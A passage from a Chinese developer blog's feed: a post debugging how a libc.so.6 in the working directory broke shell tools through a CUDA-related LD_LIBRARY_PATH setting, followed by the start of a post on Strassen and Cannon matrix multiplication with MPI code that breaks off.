title="[水贴]记一次离谱报错"/><published>2024-12-01T00:00:00+00:00</published><updated>2024-12-01T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%B0%B1%E7%9A%84%E6%8A%A5%E9%94%99</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%B0%B1%E7%9A%84%E6%8A%A5%E9%94%99/"><![CDATA[<h5 id="前情提要-由于国赛在即-而本人已经做了一个多月的dev没有碰过pwn-所以打算复健一下-结果第一个上午用着wsl就碰上了一个离谱bug">前情提要: 由于国赛在即, 而本人已经做了一个多月的dev没有碰过pwn, 所以打算复健一下, 结果第一个上午用着wsl就碰上了一个离谱bug</h5> <h3 id="bug">Bug</h3> <h5 id="-一个归档文件中-包含了一个名为libcso6的libc同名文件-然后tar--xf一下-奇迹出现了-shell内除了buildin的工具全部失效了-显示以下报错">    一个归档文件中, 包含了一个名为<code class="language-plaintext highlighter-rouge">libc.so.6</code>的libc同名文件, 然后<code class="language-plaintext highlighter-rouge">tar -xf</code>一下, 奇迹出现了, shell内除了buildin的工具全部失效了, 显示以下报错</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.28<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by <span class="nb">ls</span><span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.34<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.30<span class="s1">' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
ls: libc.so.6: version `GLIBC_2.34'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
</code></pre></div></div> <h5 id="然而-当使用cd离开这个目录之后-一切又恢复正常-而且vscode中提供的文件操作也可以使用">   然而, 当使用cd离开这个目录之后, 一切又恢复正常, 而且vscode中提供的文件操作也可以使用</h5> <h5 id="笔者又从zsh切换到bash-然后是sh-发现问题不变">   笔者又从zsh切换到bash, 然后是sh, 发现问题不变,</h5> <h3 id="找原因和debug">找原因和Debug</h3> <h5 id="综上所述-问题的根源应该是非shell-buildin的工具寻址里libcso6时出现了问题-在工作目录中没有名为libcso6的文件时-会正常寻址-有的时候则会尝试链接当前的工作目录下的文件">   综上所述, 问题的根源应该是非shell buildin的工具寻址里libc.so.6时出现了问题, 在工作目录中没有名为<code class="language-plaintext highlighter-rouge">libc.so.6</code>的文件时, 会正常寻址, 有的时候则会尝试链接当前的工作目录下的文件</h5> <h5 id="证据如下">   证据如下</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># libc.so.6 版本过低</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.28<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by <span class="nb">ls</span><span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.34<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.30<span class="s1">' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
ls: libc.so.6: version `GLIBC_2.34'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
<span class="c"># libc.so.6 空的, 或者是一个文本文件</span>
<span class="nb">ls</span>: error <span class="k">while </span>loading shared libraries: libc.so.6: file too short
<span class="c"># libc.so.6 格式不对</span>
<span class="nb">ls</span>: error <span class="k">while </span>loading shared libraries: libc.so.6: cannot dynamically load position-independent executable
</code></pre></div></div> <h5 id="显然问题和库文件的搜索有关-笔者想起来前段时间安装cuda时更改过bashrc中的搜索路径的环境变量-当时在bashrc的结尾加上了-作为nvcc的库文件搜索路径">   显然问题和库文件的搜索有关, 笔者想起来前段时间安装cuda时更改过<code class="language-plaintext highlighter-rouge">.bashrc</code>中的搜索路径的环境变量<br/>    当时在<code class="language-plaintext highlighter-rouge">.bashrc</code>的结尾加上了, 作为<code class="language-plaintext highlighter-rouge">nvcc</code>的库文件搜索路径</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#config cuda</span>
<span class="nb">export </span><span class="nv">CUDA_HOME</span><span class="o">=</span>/usr/local/cuda-12.3
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:<span class="nv">$CUDA_HOME</span>/bin
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/lib64
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/extras/CUPTI/lib64
</code></pre></div></div> <h5 id="由于bashrc中默认没有ld_library_path的配置至少我的没有-所以上述的工具在cuda的库文件中肯定找不到libcso6-所以理论上将libcso6重新加到搜索路径中即可">   由于<code class="language-plaintext highlighter-rouge">.bashrc</code>中默认没有<code class="language-plaintext highlighter-rouge">LD_LIBRARY_PATH</code>的配置(至少我的没有), 所以上述的工具在CUDA的库文件中肯定找不到libc.so.6, 所以理论上将libc.so.6重新加到搜索路径中即可</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/lib/x86_64-linux-gnu

<span class="c">#config cuda</span>
<span class="nb">export </span><span class="nv">CUDA_HOME</span><span class="o">=</span>/usr/local/cuda-12.3
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:<span class="nv">$CUDA_HOME</span>/bin
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/lib64
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/extras/CUPTI/lib64
</code></pre></div></div> <h5 id="大概就是这样-完成之后再source-bashrc-即可">   大概就是这样, 完成之后再<code class="language-plaintext highlighter-rouge">source .bashrc</code>, 即可</h5> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /home/pwn/testtable/works ▓▒░                                                                                         ░▒▓ ✔  root@PainTech  10:48:21 ─╮
╰─ <span class="nb">ls</span>                                                                                                                                                       ─╯
libc  libc.so.6  pwn
</code></pre></div></div> <h3 id="在此之后">在此之后</h3> <h5 id="即使成功解决了bug-有几个问题没有存在疑惑">   即使成功解决了bug, 有几个问题没有存在疑惑</h5> <h5 id="1-bashrc在ld_library_path没有被填写的情况下-为何正常链接">   1. <code class="language-plaintext highlighter-rouge">.bashrc</code>在LD_LIBRARY_PATH没有被填写的情况下, 为何正常链接</h5> <h5 id="2-为何工作目录下没有libcso6可以正常链接">   2. 为何工作目录下没有libc.so.6可以正常链接</h5> <h5 id="这里主要和ld_library_path的工作有关动态链接的文件会按照ld_library_path所列出的顺序-依次查找-路径之间使用--分割">   这里主要和LD_LIBRARY_PATH的工作有关,<br/>   动态链接的文件会按照LD_LIBRARY_PATH所列出的顺序, 依次查找, 路径之间使用 ‘:’ 分割</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ ~ ▓▒░                                                                                                                         ░▒▓ ✔  root@PainTech  11:09:01 ─╮
╰─ <span class="nb">echo</span> <span class="nv">$LD_LIBRARY_PATH</span>                                                                                                                                            ─╯
/lib/x86_64-linux-gnu:/usr/local/cuda-12.3/lib64:/usr/local/cuda-12.3/extras/CUPTI/lib64
</code></pre></div></div> <h5 id="所以当添加好libc的目录之后-链接就不再会出问题">   所以当添加好libc的目录之后, 链接就不再会出问题<br/></h5> <h5 id="但是仅仅这样无法解释-之前没有libx86_64-linux-gnu时如何正常工作-以及为什么有上面的bug出现">   但是仅仅这样无法解释, 之前没有<code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu</code>时如何正常工作, 以及为什么有上面的bug出现<br/></h5> <h5 id="linux一个可执行文件寻找自己的链接的动态库有5种方式-绝对路径-相对路径--rpath-ld_library_path-etcldsoconf这样写应该会比较具体-但是网上的资料至少是中文资料大多不全-或者是没有明确的执行顺序的排列">   linux一个可执行文件寻找自己的链接的动态库有5种方式, 绝对路径 相对路径 -rpath LD_LIBRARY_PATH /etc/ld.so.conf(这样写应该会比较具体), 但是网上的资料(至少是中文资料)大多不全, 或者是没有明确的执行顺序的排列<br/></h5> <h5 id="举个例子-下面是一个elf的header-interpreter为绝对路径-ld一般都是绝对路径-因为需要ld来执行库的查找">   举个例子, 下面是一个ELF的Header, Interpreter为绝对路径, ld一般都是绝对路径, 因为需要ld来执行库的查找<br/></h5> <h5 id="needed-library比较有说头-像这里的libcso6-首先一般情况下它应该被设计为某个文件夹中的一个文件名-但是实际上-也可以被看作一个相对路径作为对比-如果是-libcso6-就是一个单纯的相对路径">   Needed Library比较有说头, 像这里的’libc.so.6’, 首先一般情况下它应该被设计为某个文件夹中的一个文件名, 但是实际上, 也可以被看作一个相对路径,<br/>   作为对比, 如果是 ‘./libc.so.6’ 就是一个单纯的相对路径<br/></h5> <h5 id="猜测是ls等非shell-buildin-的工具-在链接时把-libcso6-当成了相对路径-这里的相对是相对于使用命令的工作目录">   猜测是ls等非shell buildin 的工具, 在链接时把 ‘libc.so.6’ 当成了相对路径, 这里的相对是相对于使用命令的工作目录</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="-rpath-检查-rpath指定的路径--rpath是编译器编译时的一个可选项-下面是未使用和使用了-rpath参数的对比">   -rpath, 检查-rpath指定的路径, -rpath是编译器编译时的一个可选项, 下面是未使用和使用了-rpath参数的对比</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>

LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libstdc++.so.6'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
LOAD:0000000000000000 <span class="p">;</span> Library runpath <span class="s1">'/lib/x86_64-linux-gnu'</span> <span class="c"># &lt;------</span>
</code></pre></div></div> <h5 id="意思就是-needed-library-需要在-library-runpath-中找">   意思就是 <code class="language-plaintext highlighter-rouge">Needed Library</code> 需要在 <code class="language-plaintext highlighter-rouge">Library runpath</code> 中找</h5> <h5 id="ls执行文件的header信息-可以看到是没有指定-rpath的-没有-rpath相当于第一步直接放弃掉了">   ls执行文件的header信息, 可以看到是没有指定-rpath的, 没有-rpath相当于第一步直接放弃掉了</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libselinux.so.1'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="-检查ld_library_path-流程不再赘述了-注意的是-ld_library_path是由bash等交互提供的-默认情况下应该是空的-但是实际上包含了usrlib以及lib文件夹">    检查LD_LIBRARY_PATH, 流程不再赘述了. 注意的是, LD_LIBRARY_PATH是由Bash等交互提供的, 默认情况下应该是空的, 但是实际上包含了<code class="language-plaintext highlighter-rouge">/usr/lib</code>以及<code class="language-plaintext highlighter-rouge">/lib</code>文件夹<br/></h5> <h5 id="-搜索etcldsoconf">    搜索<code class="language-plaintext highlighter-rouge">/etc/ld.so.conf</code>,</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ ~ ▓▒░                                                                                                                         ░▒▓ ✔  root@PainTech  13:24:04 ─╮
╰─ <span class="nb">cat</span> /etc/ld.so.conf                                                                                                                                              ─╯
include /etc/ld.so.conf.d/<span class="k">*</span>.conf
</code></pre></div></div> <h5 id="ldsoconf应该是没有动过的">   ld.so.conf应该是没有动过的</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /etc/ld.so.conf.d ▓▒░                                                                                                         ░▒▓ ✔  root@PainTech  13:25:10 ─╮
╰─ <span class="nb">ls</span>                                                                                                                                                               ─╯
000_cuda.conf     fakeroot-x86_64-linux-gnu.conf  i386-linux-gnu.conf  libc.conf              zz_i386-biarch-compat.conf
988_cuda-12.conf  gds-12-3.conf  
</code></pre></div></div> <h5 id="这里主要关注x86和libc的conf文件">   这里主要关注x86和libc的conf文件</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /etc/ld.so.conf.d ▓▒░                                                                                                         ░▒▓ ✔  root@PainTech  13:25:52 ─╮
╰─ <span class="nb">cat </span>x86_64-linux-gnu.conf                                                                                                                                        ─╯
<span class="c"># Multiarch support</span>
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /etc/ld.so.conf.d ▓▒░                                                                                                         ░▒▓ ✔  root@PainTech  13:25:56 ─╮
╰─ <span class="nb">cat </span>libc.conf                                                                                                                                                    ─╯
<span class="c"># libc default configuration</span>
/usr/local/lib
</code></pre></div></div> <h3 id="如何导致bug的发生">如何导致bug的发生</h3> <h5 id="希腊奶只知道是由于可执行文件的中needed-library-中的-libcso6字段在链接过程中产生了歧义-一方面可以指的是环境变量路径中的libcso6-一方面也可以指工作目录下的libc即libcso6-由于种种原因-导致越过了ld_library和ldconfd的配置-直接在当前文件夹中尝试链接但是更具体的-ld_library和ldconfd的配置为什么被越过-以及正常情况下-它们的查找顺序是如何的仍然不太清晰">   希腊奶.<br/>   只知道是由于可执行文件的中<code class="language-plaintext highlighter-rouge">Needed Library</code> 中的 <code class="language-plaintext highlighter-rouge">libc.so.6</code>字段在链接过程中产生了歧义, 一方面可以指的是环境变量路径中的<code class="language-plaintext highlighter-rouge">libc.so.6</code>, 一方面也可以指工作目录下的libc(即<code class="language-plaintext highlighter-rouge">./libc.so.6</code>), 由于种种原因, 导致越过了<code class="language-plaintext highlighter-rouge">LD_LIBRARY</code>和ld.conf.d的配置, 直接在当前文件夹中尝试链接<br/>   但是更具体的, <code class="language-plaintext highlighter-rouge">LD_LIBRARY</code>和ld.conf.d的配置为什么被越过, 以及正常情况下, 它们的查找顺序是如何的仍然不太清晰</h5>]]></content><author><name>久菜合子</name></author><category term="debug"/><category term="水"/><summary type="html"><![CDATA[前情提要: 由于国赛在即, 而本人已经做了一个多月的dev没有碰过pwn, 所以打算复健一下, 结果第一个上午用着wsl就碰上了一个离谱bug]]></summary></entry><entry><title type="html">矩阵并行计算的探索—大作业</title><link href="https://leakbox258.github.io/blog/2024/%E7%9F%A9%E9%98%B5%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E7%9A%84%E6%8E%A2%E7%B4%A2/" rel="alternate" type="text/html" title="矩阵并行计算的探索—大作业"/><published>2024-11-15T00:00:00+00:00</published><updated>2024-11-15T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E7%9F%A9%E9%98%B5%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E7%9A%84%E6%8E%A2%E7%B4%A2</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E7%9F%A9%E9%98%B5%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E7%9A%84%E6%8E%A2%E7%B4%A2/"><![CDATA[<p>ps: 课题来自于泥卓的课后作业 ps: 建议把页面markdown自己放到vscode或者typora上, 因为本站的markdown似乎没有办法显示Latex语法</p> <h3 id="实验器材与工具">实验器材与工具</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>处理器：13th Gen Intel(R) Core(TM) i7-13700H   2.40 GHz
机带RAM: 16.0GB(15.7GB可用)
WSL 版本： 2.3.24.0
内核版本： 5.15.153.1-2
WSLg 版本： 1.0.65
MSRDC 版本： 1.2.5620
Direct3D 版本： 1.611.1-81528511
DXCore 版本： 10.0.26100.1-240331-1435.ge-release
Windows 版本： 10.0.22631.4317
g++ 版本：11.4.0
nvidia-cuda-toolkit: 12.3
</code></pre></div></div> <h3 id="矩阵乘法优化算法">矩阵乘法优化算法</h3> <h5 id="存在矩阵mmn和矩阵nnt做矩阵乘法按照矩阵乘法的定义一共需要做mnt次乘法计算以及mnt次加法计算不难理解如果可以减少运算的次数那么就会产生直观的优化效果">   存在矩阵M(m*n)和矩阵N(n*t)做矩阵乘法，按照矩阵乘法的定义，一共需要做m*n*t次乘法计算，以及m*n*t次加法计算，不难理解如果可以减少运算的次数，那么就会产生直观的优化效果</h5> <h5 id="strassen算法">Strassen算法<br/></h5> <h5 id="由上述分析一般的矩阵运算需要on3的复杂度但strassen算法通过分治的思想将大矩阵化成小矩阵-可以将这个值降至约on281">   由上述分析，一般的矩阵运算需要O(n\^3)的复杂度，但Strassen算法通过分治的思想，将大矩阵化成小矩阵, 可以将这个值降至约O(n\^2.81)<br/></h5> <h5 id="如图将两个44矩阵分割为四个分块矩阵">   如图，将两个4*4矩阵分割为四个分块矩阵，</h5> <p>$ A = \begin{bmatrix} \begin{pmatrix}a_{11}&amp;a_{12}\a_{21}&amp;a_{22}\end{pmatrix} &amp; \begin{pmatrix}a_{31}&amp;a_{32}\a_{41}&amp;a_{42}\end{pmatrix}<br/> \begin{pmatrix}a_{51}&amp;a_{52}\a_{61}&amp;a_{62}\end{pmatrix} &amp; \begin{pmatrix}a_{71}&amp;a_{72}\a_{81}&amp;a_{82}\end{pmatrix} \end{bmatrix} = \begin{bmatrix}A_1 &amp; A_2 \ A_3 &amp; A_4\end{bmatrix} <br/> B = \begin{bmatrix} \begin{pmatrix}b_{11}&amp;b_{12}\b_{21}&amp;b_{22}\end{pmatrix} &amp; \begin{pmatrix}b_{31}&amp;b_{32}\b_{41}&amp;b_{42}\end{pmatrix}<br/> \begin{pmatrix}b_{51}&amp;b_{52}\b_{61}&amp;b_{62}\end{pmatrix} &amp; \begin{pmatrix}b_{71}&amp;b_{72}\b_{81}&amp;b_{82}\end{pmatrix} \end{bmatrix} = \begin{bmatrix}B_1 &amp; B_2 \ B_3 &amp; B_4\end{bmatrix} $</p> <h5 id="此时c_11和矩阵c的计算方式如下">   此时，$C_{11}$和矩阵$C$的计算方式如下</h5> <p>$ C_{11} = \left(\begin{pmatrix}a_{11}&amp;a_{12}\a_{21}&amp;a_{22}\end{pmatrix}\begin{pmatrix}b_{11}&amp;b_{12}\b_{21}&amp;b_{22}\end{pmatrix}\right)+\left(\begin{pmatrix}a_{31}&amp;a_{32}\a_{41}&amp;a_{42}\end{pmatrix}\begin{pmatrix}b_{51}&amp;b_{52}\b_{61}&amp;b_{62}\end{pmatrix}\right) $ $ C = \begin{bmatrix} C_{11} &amp; C_{12}<br/> C_{21} &amp; C_{22} \end{bmatrix} $</p> <h5 id="用这种方式计算时时间代价来自两部分多次子矩阵乘法以及运算结果合并与组合">   用这种方式计算时，时间代价来自两部分，多次子矩阵乘法，以及运算结果合并与组合</h5> <p>$T(n) = k*T(n/2) + O(n^2), k代表矩阵乘法次数$</p> <h5 id="上式中的后项表示加法和合并的时间复杂度由于矩阵乘法本身为on3而前项的乘法是主要的时间开销所以化简的一种方式是尽可能减少乘法次数">   上式中的后项表示加法和合并的时间复杂度，由于矩阵乘法本身为$O(n^3)$，而前项的乘法是主要的时间开销。所以化简的一种方式是尽可能减少乘法次数</h5> <h5 id="以上面的a-b为例">   以上面的$A, B$为例</h5> <h5 id="首先先通过加减获得10个-22-矩阵如下">   首先先通过加减获得10个 2*2 矩阵如下</h5> <p>$ S_1 = B_{12} - B_{22}<br/> S_2 = A_{11} + A_{12}<br/> S_3 = A_{21} + A_{22}<br/> S_4 = B_{21} - B_{11}<br/> S_5 = A_{11} + A_{22}<br/> S_6 = B_{11} + B_{22}<br/> S_7 = A_{12} - A_{22}<br/> S_8 = B_{21} + B_{22}<br/> S_9 = A_{11} - A_{21}<br/> S_{10} = B_{11} + B_{12} $</p> <h5 id="然后再进一步通过乘法运算得到">   然后再进一步通过乘法运算得到</h5> <p>$ P_{1} =A_{11}\cdot S_{1}=A_{11}\cdot B_{12}-A_{11}\cdot B_{22}<br/> P_{2} =S_{2}\cdot B_{22}=A_{11}\cdot B_{22}+A_{12}\cdot B_{22}<br/> P_{3} =S_{3}\cdot B_{11}=A_{21}\cdot B_{11}+A_{22}\cdot B_{11}<br/> P_{4} =A_{22}\cdot S_{4}=A_{22}\cdot B_{21}-A_{22}\cdot B_{11}<br/> P_{5} =S_{5}\cdot S_{6}=A_{11}\cdot B_{11}+A_{11}\cdot B_{22}+A_{22}\cdot B_{11}+A_{22}\cdot B_{22}<br/> P_{6} =S_{7}\cdot S_{8}=A_{12}\cdot B_{21}+A_{12}\cdot B_{22}-A_{22}\cdot B_{21}-A_{22}\cdot B_{22}<br/> P_{7} =S_{9}\cdot S_{10}=A_{11}\cdot B_{11}+A_{11}\cdot B_{12}-A_{21}\cdot B_{11}-A_{21}\cdot B_{12} $</p> <h5 id="根据组合可以发现c实际上可以由上述计算的结果加减得到">   根据组合，可以发现$C$实际上可以由上述计算的结果加减得到</h5> <p>$ C_{11} = P_5 + P_4 - P_2 + P_6 <br/> C_{12} = P_1 + P_2 <br/> C_{21} = P_3 + P_4 <br/> C_{22} = P_5 + P_1 - P_3 - P_7 $</p> <h5 id="上述方法总共有7次-22-的矩阵乘法比直接计算少一次这是因为最后一次乘法的结果实际上可以由之前7次加减组合得到对于较大的矩阵乘法使用分治的方法递归的化为更小的矩阵相乘可以在递归的过程中多次减少所需乘法的数量对于本例时间复杂度为onlog_27">   上述方法总共有7次 2*2 的矩阵乘法，比直接计算少一次,这是因为最后一次乘法的结果实际上可以由之前7次加减组合得到。对于较大的矩阵乘法，使用分治的方法递归的化为更小的矩阵相乘，可以在递归的过程中多次减少所需乘法的数量<br/>   对于本例，时间复杂度为$O(n^{log_27})$</h5> <h5 id="更具体方式参考httpszhuanlanzhihucomp78657463-">   更具体方式参考https://zhuanlan.zhihu.com/p/78657463 <br/></h5> <h5 id="进一步的使用coppersmith-winograd可以将复杂度降至on2376">   进一步的，使用Coppersmith-Winograd可以将复杂度降至$O(n^{2.376})$<br/></h5> <h3 id="进程级别并行">进程级别并行</h3> <h4 id="cannon卡农算法">Cannon卡农算法</h4> <h5 id="假如可以将不同的c_ij的计算划给不同的进程分别计算最后组合拼接以获得的最终的矩阵c在这个过程中单独的一个进程将会需要a_i1-a_i2-a_i3b_1j-b_2j-b_3j等多个子矩阵来计算c_ij但是由于每个进程需要获取的子矩阵中存在重叠也就是一个子矩阵会被复制进入多个进程不利于节省空间开支在使用卡农算法时使每个进程只保存当前进程的计算结果以及两个子矩阵在各个进程完成了一轮计算后通过进程间的通信进程之间交换子矩阵以达到避免重复保存的效果">   假如可以将不同的$C_{ij}$的计算划给不同的进程分别计算，最后组合拼接以获得的最终的矩阵$C$.<br/>   在这个过程中，单独的一个进程将会需要$A_{i1}, A_{i2}, A_{i3}…B_{1j}, B_{2j}, B_{3j}…$等多个子矩阵来计算$C_{ij}$，但是由于每个进程需要获取的子矩阵中存在重叠，也就是一个子矩阵会被复制进入多个进程，不利于节省空间开支。<br/>   在使用卡农算法时，使每个进程只保存当前进程的计算结果、以及两个子矩阵，在各个进程完成了一轮计算后，通过进程间的通信，进程之间交换子矩阵，以达到避免重复保存的效果。</h5> <h5 id="例如存在方阵annbnn相乘得到矩阵c第一步将矩阵各分为sqrtn--sqrtn向下取整个子矩阵并将运算任务分配至n个线程-对应计算c_ij的进程中需要保存的子矩阵是a_ij-b_ij第二步进行子矩阵的对齐操作以计算c_ij的线程为例通过进程间通信使得a_ij在整个a中循环左移i位得到a_ij-i-1sqrtnsqrtn同理b_ij向上循环右移j位">   例如存在方阵A(n*n)，B(n*n)相乘得到矩阵C.<br/>   第一步，将矩阵各分为$\sqrt{n} * \sqrt{n}$（向下取整）个子矩阵，并将运算任务分配至$n$个线程, 对应计算$C_{ij}$的进程中需要保存的子矩阵是$A_{ij}, B_{ij}$<br/>   第二步，进行子矩阵的对齐操作。以计算$C_{ij}$的线程为例，通过进程间通信，使得$A_{ij}$在整个$A$中循环左移i位，得到$A_{i((j-i-1+\sqrt{n})\%\sqrt{n})}$，同理$B_{ij}$向上循环右移j位.</h5> <p><img src="https://www.helloimg.com/i/2024/11/10/67305d00b2eee.png" alt="697687-20190318173518810-1350254261.png"/></p> <h5 id="第三步各个进程执行一次矩阵乘法累加到c_ij然后将a_ij和b_ij分别向左向上移动一步-重复第三步直到一共计算sqrtn次乘法">   第三步，各个进程执行一次矩阵乘法，累加到$C_{ij}$，然后将$A_{ij}$和$B_{ij}$分别向左向上移动一步<br/>    重复第三步，直到一共计算$\sqrt{n}$次乘法</h5> <h5 id="第五步将各个进程的结果组合得到矩阵乘法结果">   第五步，将各个进程的结果组合得到矩阵乘法结果.</h5> <h5 id="在这种方法中除了乘法运算之外进程之间的通讯也会影响运算速度">   在这种方法中，除了乘法运算之外，进程之间的通讯也会影响运算速度，</h5> <h4 id="分布式并行">分布式并行</h4> <h5 id="分布式并行计算是指将一个大型的计算任务分解成多个较小的子任务这些子任务被分配到多个计算节点如服务器处理器等上同时进行计算这些节点通过网络进行通信和协调最终将各个子任务的计算结果汇总得到整个任务的解决方案mpi是这种分布式并行的一种实现方式mpi是一套在进程间传输数据的接口-现有的mpi实现有mpich-openmpi-intel-mpi根据进程之间通信方式不同mpi的具体操作方式可以分为主从模式和对等模式以下是一个使用mpich基于主从模式的cannon算法的实现">   分布式并行计算是指将一个大型的计算任务分解成多个较小的子任务，这些子任务被分配到多个计算节点（如服务器、处理器等）上同时进行计算。这些节点通过网络进行通信和协调，最终将各个子任务的计算结果汇总，得到整个任务的解决方案<br/>   MPI是这种分布式并行的一种实现方式，MPI是一套在进程间传输数据的接口, 现有的MPI实现有<code class="language-plaintext highlighter-rouge">MPICH, openMPI, Intel MPI</code><br/>   根据进程之间通信方式不同，MPI的具体操作方式可以分为主从模式和对等模式，以下是一个使用MPICH基于主从模式的Cannon算法的实现。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"/usr/include/mpi/mpi.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;math.h&gt;</span><span class="cp">
</span> 
<span class="kt">int</span> <span class="nf">get_index</span><span class="p">(</span><span class="kt">int</span> <span class="n">row</span><span class="p">,</span><span class="kt">int</span> <span class="n">col</span><span class="p">,</span><span class="kt">int</span> <span class="n">N</span><span class="p">){</span>
   <span class="k">return</span> <span class="p">((</span><span class="n">row</span><span class="o">+</span><span class="n">N</span><span class="p">)</span><span class="o">%</span><span class="n">N</span><span class="p">)</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="p">(</span><span class="n">col</span><span class="o">+</span><span class="n">N</span><span class="p">)</span><span class="o">%</span><span class="n">N</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">int</span> <span class="n">M</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="n">N</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="n">K</span><span class="o">=</span><span class="mi">4</span><span class="p">;</span>
   <span class="kt">int</span> <span class="n">rank</span><span class="p">,</span><span class="n">comm_sz</span><span class="p">;</span>
